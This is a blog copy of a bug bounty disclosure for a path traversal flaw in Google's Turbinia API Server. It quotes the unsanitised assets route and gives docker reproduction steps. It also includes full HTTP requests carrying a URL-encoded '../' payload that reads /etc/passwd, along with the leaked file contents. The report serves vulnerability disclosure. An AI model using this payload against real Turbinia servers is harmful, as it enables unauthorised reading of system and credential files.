---
layout: post
title:  "Google: Local File Inclusion in Turbinia API Server($101)"
date:  2024-05-08 10:31:06 +0800
categories: file-overwrite
---

## Name

> Local File Inclusion in Turbinia API Server

## Weakness

> CWE-22: Path Traversal

## Severity

> High (8.8)


## Description

A local file inclusion is present in the Turbinia API Server when requesting resource files under the `/assets/{catchall:path}` route.

## Proof of Concept

The [route](https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L47) `/assets/{catchall:path}` is used for serving CSS and JS resources for Turbinia Web service. The `catchall` parameter in url is not sanitized before appended to base path, an attacker can use `../` to escape base directory and locate any file on system which will be sent back to the attacker, causing local file inclusion issue.

```
@ui_router.get(
    '/assets/{catchall:path}', name='assets', include_in_schema=False)
async def serve_assets(request: Request):
  """Serves assets content."""
  static_content_path = pathlib.Path(_config.WEBUI_PATH).joinpath('dist/assets')
  path = request.path_params['catchall']
  file = static_content_path.joinpath(path)
  if os.path.exists(file):
    return FileResponse(file)

  raise HTTPException(status_code=404, detail='Not found')
```

### Steps to reproduce

Following official [docker tutorial](https://turbinia.readthedocs.io/en/latest/user/install.html#docker-installation) to set up the Turbinia service:

```
git clone https://github.com/google/turbinia.git
cd turbinia
mkdir -p ./conf && mkdir -p ./tmp && mkdir -p ./evidence && mkdir -p ./certs && chmod 777 ./conf ./tmp ./evidence ./certs
sed -f docker/local/local-config.sed turbinia/config/turbinia_config_tmpl.py > conf/turbinia.conf
```
Then, edit the `./docker/local/docker-compose.yml`, in `turbinia-api-server` section, expose Turbinia API Server port `8000` to host mechine by adding `ports: - "8000:8000"`:

```
...
turbinia-api-server:
        #image: "turbinia-api-server-dev" # Use this for local development and comment out below line
        image: "us-docker.pkg.dev/osdfir-registry/turbinia/release/turbinia-api-server:latest" # Latest stable
        container_name: turbinia-api-server
        depends_on:
            - redis
        volumes:
            - $PWD/evidence:/evidence
            - $PWD/conf/turbinia.conf:/etc/turbinia/turbinia.conf
        environment:
            - LC_ALL=C.UTF-8
            - LANG=C.UTF-8
            - TURBINIA_EXTRA_ARGS=${TURBINIA_EXTRA_ARGS}
        expose:
            - "8000"
        ports:
            - "8000:8000"
...
```
Finally, bring up the local Turbinia stack:

```
docker-compose -f ./docker/local/docker-compose.yml up
```

After service up, the Turbinia API Server will listen on `http://127.0.0.1:8000`. Open the webpage `http://127.0.0.1:8000` in browser and intecept requests using burp suite or chrome devtools. We can capture following request:

```
GET http://127.0.0.1:8000/assets/index-a76ac6aa.js HTTP/1.1
Accept: */*
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
Cache-Control: no-cache
Cookie: fakesession=hello
Origin: http://0.0.0.0:8000
Pragma: no-cache
Referer: http://0.0.0.0:8000/web
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Postman-Token: 0ee2337d-af8f-4873-afd8-91a9c27897b1
Host: 127.0.0.1:8000
Accept-Encoding: gzip, deflate
Connection: close
```

Modify the request by change `index-a76ac6aa.js` part to `..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd` which is `../../../../../../etc/passwd` url-encoded content.

```
GET http://127.0.0.1:8000/assets/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Accept: */*
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
Cache-Control: no-cache
Cookie: fakesession=hello
Origin: http://0.0.0.0:8000
Pragma: no-cache
Referer: http://0.0.0.0:8000/web
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Postman-Token: 0ee2337d-af8f-4873-afd8-91a9c27897b1
Host: 127.0.0.1:8000
Accept-Encoding: gzip, deflate
Connection: close
```

Or just open link: `http://127.0.0.1:8000/assets/..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd` in browser.

The output is the contents of the `/etc/passwd` file:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
turbinia:x:999:999::/home/turbinia:/sbin/nologin
```

![Turbinia](/assets/cve/Turbinia.png)

## Impact

Any file on the backend filesystem can be read by an attacker with access to the Turbinia API Server website.


## Reference

[https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67](https://huntr.com/bounties/29ec621a-bd69-4225-ab0f-5bb8a1d10c67)

## Occurrences

[https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53](https://github.com/google/turbinia/blob/1da2d19f9b79dac8df37bdf2ed4f9d5d0797607b/turbinia/api/routes/ui.py#L53)
